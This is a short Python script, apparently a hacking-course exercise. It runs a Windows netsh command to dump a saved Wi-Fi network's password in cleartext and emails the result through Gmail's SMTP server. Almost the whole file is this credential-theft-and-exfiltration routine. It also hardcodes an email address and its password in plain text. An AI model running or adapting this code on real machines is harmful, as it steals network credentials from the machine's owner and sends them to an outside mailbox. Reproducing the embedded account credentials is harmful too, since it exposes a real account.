#!/usr/bin/env python
import subprocess,smtplib#sntblib allow to send email from py code
def send_mail(email,password,message):#
    server=smtplib.SMTP("smtp.gmail.com",587)#smtp.gmail.com is server that i want to use which is google server 587=port of that server 
    server.starttls()#initiate tls
    server.login(email,password)
    server.sendmail(email,email,message)#here from and to same mail address
    server.quit()

command="netsh wlan show profile HOME_WIFI key=clear"
result=subprocess.check_output(command,shell=True)#fun check_output allow to execute command and return result unlike popen
send_mail("dipendrathapa044@gmail.com","imrockstar123",result)

# https://docs.python.org/2/library/smtplib.html
# you need to enable less secure apps to use your gmail account
# go to this url to enable it "myaccount.google.com/lesssecureapp"

